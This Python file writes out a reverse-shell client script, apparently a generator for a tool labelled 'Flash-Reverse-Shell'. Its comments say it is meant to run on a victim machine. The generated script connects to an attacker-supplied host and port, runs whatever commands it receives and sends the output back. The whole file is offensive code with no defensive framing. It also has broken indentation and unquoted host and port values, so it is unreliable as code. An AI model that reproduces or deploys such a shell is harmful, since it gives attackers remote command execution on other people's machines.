# Method to call from other python files
def main(target_host, target_port, path):
    with open(path, 'w') as file:
        file.write("""
# Importing the Socket Module to create a TCP Client
# A Socket is a combination of an IP and a Port
# This program needs to be run on the victim machine, so that it can connect to the attacker
import socket
# Importing the termcolor module to print colored text
# from termcolor import colored
# Took out color module because it would create error on victim machine, if module is not installed
# Import subprocess Module to execute commands on a Windows/Linux/OS X
import subprocess

target_host = """ + target_host + """
target_port = """ + target_port + """
print('-----------------------Flash-Reverse-Shell-----------------------')

# Building a TCP Object
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to client with {Target_host, Target_port}
client.connect((target_host, target_port))
print('----------------Successfully connected!---------------')
print('-----------------------RESPONSE-----------------------')

while True:
    try:
    response = client.recv(4096)
    command = response.decode('UTF-8')
    command_parts = command.split(" ")
    try:
        output = subprocess.check_output(command_parts).decode()
        client.sendall(output.encode('UTF-8'))
    except subprocess.CalledProcessError as error:
        print('Following Error was raised: ' + str(error))

    except KeyboardInterrupt:
    print('Program forcefully stopped.')
    except FileNotFoundError:
    print('Unknown Command...')
                """)
